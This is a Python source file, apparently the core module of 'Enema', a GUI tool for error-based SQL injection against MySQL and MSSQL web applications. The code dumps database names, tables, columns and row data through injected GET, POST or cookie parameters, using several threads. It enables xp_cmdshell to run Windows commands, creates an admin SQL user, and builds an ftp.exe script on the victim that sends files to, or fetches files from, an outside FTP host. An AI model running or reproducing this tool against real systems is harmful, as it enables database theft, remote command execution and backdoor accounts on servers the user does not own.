"""
    Enema module: Core
    Copyright (C) 2011 Valeriy Bogachuk
    
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
"""

import sys
import time
import txtproc
import e_const
import socket
from PyQt4 import QtCore
from threading import *
from queue import Queue
from urllib import request
from urllib.error import HTTPError
from urllib.error import URLError
from urllib.parse import urlencode

class ErrorBased(QtCore.QThread):
    
    #---------------Signals---------------#
    debugSignal = QtCore.pyqtSignal(str)
    reqLogSignal = QtCore.pyqtSignal(str)
    dbSignal = QtCore.pyqtSignal(str)
    tblCountSignal = QtCore.pyqtSignal(str)
    tblSignal = QtCore.pyqtSignal(str)
    progressSignal = QtCore.pyqtSignal(int, bool)
    msgSignal = QtCore.pyqtSignal(str)
    columnSignal = QtCore.pyqtSignal(str, int)
    cmdSignal = QtCore.pyqtSignal(int, str, bool, int)
    querySignal = QtCore.pyqtSignal(str)
    rowDataSignal = QtCore.pyqtSignal(int, int, str)
    positionSignal = QtCore.pyqtSignal(str)
    taskDone = QtCore.pyqtSignal(str)
    #-------------------------------------#
    
    def __init__(self, args, qstrs):
        QtCore.QThread.__init__(self)
        self.vars = args
        self.qstrings = qstrs
        
    def run(self):

        if self.vars['task'] == "tables": self.getTables()
        elif self.vars['task'] == "count": self.getCountInTable()
        elif self.vars['task'] == "bases": self.getBases()
        elif self.vars['task'] == "columns": self.getColumns()
        elif self.vars['task'] == "cmd": self.xpCmdShell()
        elif self.vars['task'] == "enable_openrowset": self.enableOpenrowset()
        elif self.vars['task'] == "enable_cmd": self.enableXpCmdShell()
        elif self.vars['task'] == "ftp": self.uploadFile()
        elif self.vars['task'] == "query":self.runQuery()
        elif self.vars['task'] == "addSqlUser": self.addSqlUser()
        elif self.vars['task'] == "dump": self.syncThreads()
        return

#Server response debugging
    def debug(self, strValue, notFunction):
        if notFunction:
            self.debugSignal.emit(strValue)
            return
        self.debugSignal.emit("\n - [x] 'no_content' returned by function " + strValue)
        
    #Injection in cookies?:
    def isCookieInjection(self, cookie):
        if ("[sub]" or "[cmd]") in cookie:
            return True

    def buildUrl(self, strVar, query, isCmd, isCookie):
        if isCookie:
            query = request.quote(query)
            strVar = strVar.replace("[eq]", "%3d")
        else:
            strVar = strVar.replace("[eq]", "=")
        if isCmd:
            if "[cmd]" in strVar:
                strVar = strVar.replace("[cmd]", query)
                if "[sub]" in strVar:
                    strVar = strVar.replace("[sub]", "1")
            else:
                self.debug("\n [sub] or [cmd] variables not found", True)
                return
        else:
            if "[cmd]" in strVar:
                strVar = strVar.replace(";[cmd]", "")
            strVar = strVar.replace("[sub]", query)
        return strVar

    #Content parser
    def contentParse(self, content, match_pattern, match_sybol):
        patternStr = content.find(match_pattern)
        fromStr = content.find(match_sybol, patternStr, len(content))
        fromStr += 1
        toStr = content.find(match_sybol, fromStr, len(content))
        if (fromStr or toStr) <= 0:
            file = open("err_response.html", "w")
            file.write(content)
            file.close()
            self.debug("\n==================[SERVER RESPONSE]==================\n\n"\
                    + content +\
                    "\n\n>>>Saved to file: err_response.html", True)
            return "no_content"
        return content[fromStr:toStr]
    
#Preparing POST data
    def preparePostData(self, data, query, isCmd):
        data = ''.join([x.replace("=",  ":") for x in data])
        data = data.replace("[eq]", "=")
        if isCmd:
            if "[cmd]" in data:
                data = data.replace("[cmd]", query)
                if "[sub]" in data:
                    data = data.replace("[sub]", "1")
        else:
            if "[cmd]" in data:
                data = data.replace(";[cmd]", "")
            data = data.replace("[sub]", query)
        data = data.split("&")
        data= dict([s.split(':') for s in data])
        urlEncoded = urlencode(data)
        postData = urlEncoded.encode(e_const.ENCODING)
        return postData
    
#Web request:
    def web_request(self, query, isCmd):
        urlOpener = request.build_opener()
        data = request.unquote(self.vars['data'])
        cookie = self.vars['cookie']
        data = data.replace("+",  " ")
        data = data.replace(":",  "")
        if self.vars['method'] == "POST":
            postData = self.preparePostData(data, query, isCmd)
            if self.isCookieInjection(cookie):
                cookie = self.buildUrl(cookie, query, isCmd, True)
            reqLog = "\n[POST] " + self.vars['url'] + "\n" + postData.decode(e_const.ENCODING)
            if len(cookie) > 0:
                reqLog += "\nCookie:" + cookie
                urlOpener.addheaders = [('User-Agent', e_const.USER_AGENT), ('Cookie', cookie)]
            else:
                urlOpener.addheaders = [('User-Agent', e_const.USER_AGENT)]
            try:
                self.reqLogSignal.emit(reqLog)
                response = urlOpener.open(self.vars['url'], postData, self.vars['timeOut'])
                content = response.read()
            except HTTPError as httpErr: 
                content = httpErr.read()
            #Handling timeout. 
            except socket.error:
                errno, errstr = sys.exc_info()[:2]
                if errno == socket.timeout:
                    self.debug("\n\n[Timed out]", True)
                    return "[---Timed out---]"
            except URLError as uerr:
                if isinstance(uerr.reason, socket.timeout):
                    self.debug("\n\n[Timed out]", True)
                    return "[---Timed out---]"
        else:
            if self.isCookieInjection(cookie):
                cookie = self.buildUrl(cookie, query, isCmd, True)
            else:
                get_url = self.buildUrl(self.vars['url'], query, isCmd, False)
            get_url = request.quote(get_url)
            #Replacing important symbols
            get_url = get_url.replace("%3D", "=").replace("%26", "&")\
                        .replace("%3A", ":").replace("%3F", "?")
            reqLog = "\n[GET] " + get_url
            if len(cookie) > 0:
                reqLog += "\nCookie: " + cookie
                urlOpener.addheaders = [('User-Agent', e_const.USER_AGENT), ('Cookie', cookie)]
            else:
                urlOpener.addheaders = [('User-Agent', e_const.USER_AGENT)]
            try:
                self.reqLogSignal.emit(reqLog)
                response = urlOpener.open(get_url, None, self.vars['timeOut'])
                content = response.read()
            except HTTPError as httpErr: 
                content = httpErr.read()
            #Handling timeout
            except socket.error:
                errno, errstr = sys.exc_info()[:2]
                if errno == socket.timeout:
                    self.debug("\n\n[Timed out]", True)
                    return "[---Timed out---]"
            except URLError as uerr:
                if isinstance(uerr.reason, socket.timeout):
                    self.debug("\n\n[Timed out]", True)
                    return "[---Timed out---]"
        if not isCmd:
            if e_const.QUOTED_CONTENT:
                content = request.unquote(content)
            try:
                content = content.decode(e_const.ENCODING)
            except:
                return "no_content"
            db_data = self.contentParse(content, self.vars['mp'], self.vars['ms'])
        else:
            db_data = 0
        return db_data

#SET variables in string to valid value 
    def buildQuery(self, query, vars=None):
        ms =  txtproc.strToSqlChar(self.vars['ms'], self.vars['db_type'])
        try:
                if self.vars['db_type'] == "mysql"\
                and (self.vars['task'] =='tables' or self.vars['task'] =='columns'):
                    vars['cdb'] = txtproc.strToSqlChar(vars['cdb'], self.vars['db_type'])
        except Exception:
            pass
        if vars is None:
            vars = {}
        query_vars = {
        '${MS}' : ms, 
        '${current_db}' : vars.setdefault('cdb'), 
        '${current_table}' : vars.setdefault('ctbl'),  
        '${num}' : vars.setdefault('num'), 
        '${current_column}' : vars.setdefault('ccol'),
        '${ordinal_position,}' : vars.setdefault('num'), 
        '${selected_table}' : self.vars.setdefault('selected_table'), 
        '${cmd}' : vars.setdefault('cmd'), 
        '${query_cmd}' : self.vars.setdefault('query_cmd'), 
        '${login}' : vars.setdefault('login'), 
        '${password}' : vars.setdefault('password'), 
        '${key}' : self.vars.setdefault('key'),
        '${column}' : vars.setdefault('column'), 
        '${table}' : vars.setdefault('table'), 
        '${hex}' : vars.setdefault('hex'), } 
        for key in query_vars:
            query = query.replace(key, str(query_vars[key]))
        return query
    
#Current db type selected
    def dbType(self, todo):
        if self.vars['db_type'] == "mysql":
            qstring = self.qstrings['mysql_error_based'][todo]
        else:
            qstring = self.qstrings['mssql_error_based'][todo]
        if (qstring.startswith('"') and qstring.endswith('"')):
            qstring = qstring[1:-1]
        return qstring
        
#Get current database
    def getCurrDb(self):
        if self.vars['dbListCount'] < 1:
            query = self.buildQuery(self.dbType('curr_db_name'))
            db_name = self.web_request(query, False)
            if db_name == "no_content": 
                self.debug(sys._getframe().f_code.co_name + "() -> db_name", False)
                return 'no_db'
            self.dbSignal.emit(db_name)
        else:
            db_name = self.vars['dbName']
        return db_name
        
#Getting bases
    def getBases(self):
        #If not in (array) method selected
        if self.vars['notInArray']:
            current_db = self.vars['dbName']
            while True:
                query = self.buildQuery(self.dbType('get_db_name'), {'cdb' : current_db})
                db_name = self.web_request(query, False)
                if db_name == "no_content":
                    self.debug(sys._getframe().f_code.co_name + "() -> db_name", False)
                    return
                elif db_name == "isnull":
                    break
                current_db += ",'" + db_name + "'"
                self.dbSignal.emit(db_name)
            self.progressSignal.emit(0, True)
        #not in (substring) method realisation
        else:
            query = self.buildQuery(self.dbType('dbs_count'))
            dbCount = self.web_request(query, False)
            tQueue = Queue()
            for tNum in range(int(dbCount)):  
                tQueue.put(tNum)
            for i in range(self.vars['threads']):  
                t = Thread(target=self.mtBases, args=(tNum, tQueue, dbCount)) 
                t.start()
                time.sleep(0.1)

#Multithread tables
    def mtBases(self, tNum, tQueue, dbCount):
        while True:  
            try:  
                tNum = tQueue.get_nowait()
            except Exception:  
                break
            query = self.buildQuery(self.dbType('get_db_name2'), {'num' : str(tNum)})
            db_name = self.web_request(query, False)
            if db_name == "no_content":
                self.debug(sys._getframe().f_code.co_name + "() -> db_name", False)
                return
            self.dbSignal.emit(db_name)
            time.sleep(0.1)
            tQueue.task_done()
            self.progressSignal.emit(int(dbCount) - 1, False)
        self.progressSignal.emit(0, True)
        
#Getting tables
    def getTables(self):
        current_db = self.getCurrDb()
        if current_db == 'no_db':
            return
        query = self.buildQuery(self.dbType('tbls_count'), {'cdb' : current_db})
        tblCount = self.web_request(query, False)
        if tblCount == "no_content": 
            self.debug(sys._getframe().f_code.co_name + "() -> tblCount", False)
            return
        self.tblCountSignal.emit(tblCount)
        if self.vars['notInArray']:
            current_table = ""
            while True:
                query = self.buildQuery(self.dbType('get_tbl_name'), {'cdb' : current_db, 'ctbl' : current_table})
                table_name = self.web_request(query, False)
                if table_name == "no_content":
                    self.debug(sys._getframe().f_code.co_name + "() -> table_name", False)
                    return
                elif table_name == "isnull":
                    break
                current_table += ",'" + table_name + "'"
                self.tblSignal.emit(table_name)
                self.progressSignal.emit(int(tblCount), False)
            self.progressSignal.emit(0, True)
        else:
            tQueue = Queue()
            for tNum in range(int(tblCount)):  
                tQueue.put(tNum)
            for i in range(self.vars['threads']):  
                t = Thread(target=self.mtTables, args=(tNum, tQueue,  tblCount, current_db)) 
                t.start()
                time.sleep(0.1)
        
#Multithread tables
    def mtTables(self, tNum, tQueue, tblCount, current_db):
        while True:  
            try:  
                tNum = tQueue.get_nowait()
            except Exception:  
                break
            query = self.buildQuery(self.dbType('get_tbl_name2'), {'cdb' : current_db, 'num' : str(tNum)})
            table_name = self.web_request(query, False)
            if table_name == "no_content":
                self.debug(sys._getframe().f_code.co_name + "() -> table_name", False)
                return
            self.tblSignal.emit(table_name)
            time.sleep(0.1)
            tQueue.task_done()
            self.progressSignal.emit(int(tblCount) - 1, False)
        self.progressSignal.emit(0, True)
            
#Getitng columns
    def getColumns(self):
        current_db = self.getCurrDb()
        if current_db == 'no_db':
            return
        tables = self.vars['tables']
        #If not in(array) method selected:
        if self.vars['notInArray']: 
            for i in range (self.vars['tblTreeCount']):
                current_table = txtproc.strToSqlChar(tables[i], self.vars['db_type'])
                current_column = ""
                query = self.buildQuery(self.dbType('columns_count'), {'cdb' : current_db, 'ctbl' : current_table})
                columnsInTable = self.web_request(query, False)
                if columnsInTable == "no_content": 
                    self.debug(sys._getframe().f_code.co_name + "() -> notInArray -> columnsinTable", False)
                    return
                while True:
                    query = self.buildQuery(self.dbType('get_column_name'),
                                             {'cdb' : current_db, 'ctbl' : current_table, 'ccol' : current_column})
                    column_name = self.web_request(query, False)
                    if column_name == "no_content":
                        self.debug(sys._getframe().f_code.co_name + "() -> notInArray -> column_name", False)
                        return
                    elif column_name == "isnull":
                        break
                    current_column += ",'" + column_name + "'"
                    self.columnSignal.emit(column_name, i)
                    self.progressSignal.emit(int(columnsInTable), False)
            self.progressSignal.emit(0, True)
        #If not in (substring - MSSQL) or LIMIT(MySQL) method selected
        else:
            for i in range (self.vars['tblTreeCount']):
                current_table = txtproc.strToSqlChar(tables[i], self.vars['db_type'])
                query = self.buildQuery(self.dbType('columns_count'), {'cdb' : current_db, 'ctbl' : current_table})
                columnsInTable = self.web_request(query, False)
                if columnsInTable == "no_content": 
                    self.debug(sys._getframe().f_code.co_name + "() -> columnsinTable", False)
                    return
                for rowid in range(int(columnsInTable)):
                    #If not in(substring) method selected:
                    if self.vars['notInSubstring']:
                        query = self.buildQuery(self.dbType('get_column_name2'),
                                                 {'cdb' : current_db, 'ctbl' : current_table,  'num' : str(rowid)})
                    #If ordinal_position method selected:
                    elif self.vars['ordinal_position']:
                        rowid += 1
                        query = self.buildQuery(self.dbType('get_column_name3'), 
                                                {'cdb' : current_db, 'ctbl' : current_table, 'num' : str(rowid)})
                    column_name = self.web_request(query, False)
                    if column_name == "no_content":
                        self.debug(sys._getframe().f_code.co_name + "() -> notInSubstring -> column_name", False)
                        return
                    self.columnSignal.emit(column_name, i)
                    self.progressSignal.emit(int(columnsInTable), False)
            self.progressSignal.emit(0, True)

#Show rows count in selected table
    def getCountInTable(self):
        current_db = self.getCurrDb()
        if current_db == 'no_db':
            return
        query = self.buildQuery(self.dbType('rows_count'), {'cdb' : current_db})
        rowsInTable = self.web_request(query, False)
        if rowsInTable == "no_content":
            self.debug(sys._getframe().f_code.co_name + "() -> rowsInTable", False)
            return
        msg = (rowsInTable + " rows in " + self.vars['selected_table'])
        self.msgSignal.emit(msg)
        return
#Run Query     
    def runQuery(self):
        #If this select command
        if self.vars['querySelect']:
            query = self.buildQuery(self.dbType('query'))
            result = self.web_request(query, False)
            result = result.replace("\\r", "\r")\
            .replace("\\t", "\t").replace("\\n", "\n").replace("'/",  "'")
        else:
            result = "NULL"
            self.web_request(self.vars['query_cmd'], True)
        self.querySignal.emit(result)

 #Making synchronized threads for dumper
    def syncThreads(self):
        current_db = self.getCurrDb()
        if current_db == 'no_db':
            return
        columns = self.vars['columns']
        for num in range (len(columns)):
            tQueue = Queue()
            for tNum in range(self.vars['fromPos'] + 1, self.vars['toPos'] + 1):
                tQueue.put(tNum)
            #Lock()
            for i in range(self.vars['threads']):  
                t = Thread(target=self.doDump, args=(tNum, tQueue, current_db, str(columns[num]), num))  
                t.start()
                time.sleep(0.1)
            #RLock()
            
#Data dumping           
    def doDump(self, tNum, tQueue, current_db, column, num):
        while True:
            try:  
                tNum = tQueue.get_nowait()
            except Exception:  
                break
            query = self.buildQuery(self.dbType('data_dump'), 
                                    {'cdb' : current_db, 'column' : column, 'table' : self.vars['table'], 
                                    'key' : self.vars['key'], 'num' : str(tNum)})
            rowData = self.web_request(query, False)
            if rowData == "no_content":
                rowData = "NULL"
            self.rowDataSignal.emit(tNum, num, rowData)
            time.sleep(0.1)
            tQueue.task_done()
            self.progressSignal.emit(0, False)
        self.progressSignal.emit(0, True)
        
#============================[MSSQL FUNCTIONS ONLY]============================#
#Enable xp_cmdshell request
    def enableXpCmdShell(self):
        self.web_request(self.dbType('enable_xp_cmdshell'), True)
        self.msgSignal.emit("Enable xp_cmdshell request sent.")

#xp_cmdshell - windows command execution    
    def xpCmdShell(self):
        #Delete tmp_table if already exist
        self.web_request(self.dbType('drop_tmp_tbl'), True)
        #Creating tmp table
        self.web_request(self.dbType('create_tmp_tbl'), True)
        #Inserting xp_cmdshell output to temp table
        query = self.buildQuery(self.dbType('insert_result'), {'cmd' : txtproc.strToHex(self.vars['cmd'])})
        self.web_request(query, True)
        #Getting count of rows in temp table
        rowCount = self.web_request(self.buildQuery(self.dbType('tmp_count')), False)
        if rowCount == "no_content":
            return
        self.cmdSignal.emit(0, '0', True, int(rowCount))
        tQueue = Queue()
        for tNum in range(1, int(rowCount)):  
            tQueue.put(tNum)
        for i in range(self.vars['threads']):  
            t = Thread(target=self.mtCmdOutput, args=(tNum, tQueue, rowCount)) 
            t.start()
            time.sleep(0.1)
        
#Multithreaded xp_cmdshell output extracting
    def mtCmdOutput(self, tNum, tQueue, rowCount):
        while True:  
            try:  
                tNum = tQueue.get_nowait()
            except Exception:  
                break
            query = self.buildQuery(self.dbType('get_row'), {'num' : str(tNum)})
            cmdResult = self.web_request(query, False)
            if cmdResult == "no_content":
                self.debug(sys._getframe().f_code.co_name + "() -> cmdResult", False)
                return
            self.cmdSignal.emit(tNum, txtproc.recoverSymbols(cmdResult), False, 0)
            time.sleep(0.1)
            tQueue.task_done()
            self.progressSignal.emit(int(rowCount) - 1, False)
        self.progressSignal.emit(0, True)
        
#Upload file using built-in ftp.exe 
    def uploadFile(self):
        ftpFiles = self.vars['ftpFiles']
        tmp_file = self.vars['ftpPath'] + "ftp.txt"
        execCmd = self.dbType('exec_cmdshell')
        #del ..\temp\ftp.txt /Q
        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("del " + tmp_file + " /Q")})
        self.web_request(query, True)
        #echo login> ..\temp\ftp.txt
        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo " + self.vars['login'] + "> " + tmp_file)})
        self.web_request(query, True)
        #echo password>> ..\temp\ftp.txt
        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo " + self.vars['password'] + ">> " + tmp_file)})
        self.web_request(query, True)
        for file in ftpFiles:
            #Use SEND or GET ftp command?
            if self.vars['ftp_mode'] == "get":
                #echo get file.exe c:\path\file.exe>> ..\temp\ftp.txt
                query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo get " + file + " "\
                                    + self.vars['ftpPath'] + file + ">> " + tmp_file)})
            else:
                #echo send c:\path\file.exe>> ..\temp\ftp.txt
                query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo send " + self.vars['ftpPath']\
                                    +  file + ">> " + tmp_file)})
            self.web_request(query, True)
        #echo bye>> ..\temp\ftp.txt
        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo bye>> " + tmp_file)})
        self.web_request(query, True)
        #ftp -s:..\temp\ftp.txt IP
        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("ftp -s:" + tmp_file + " " + self.vars['ip'])})
        self.web_request(query, True)
        #del ..\temp\ftp.txt /Q
        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("del " + tmp_file + " /Q")})
        self.web_request(query, True)
    
#Enable OPENROWSET request
    def enableOpenrowset(self):
        self.web_request(self.dbType('enable_openrowset'), True)
        self.msgSignal.emit("Enable OPENROWSET request sent.")
        
#Add user request        
    def addSqlUser(self):
        query =  self.buildQuery(self.dbType('add_sqluser'), 
                                 {'login' : self.vars['addUserLogin'], 'password' : self.vars['addUserPassword']})
        self.web_request(query, True)
        self.msgSignal.emit("Add admin user request sent.")
        
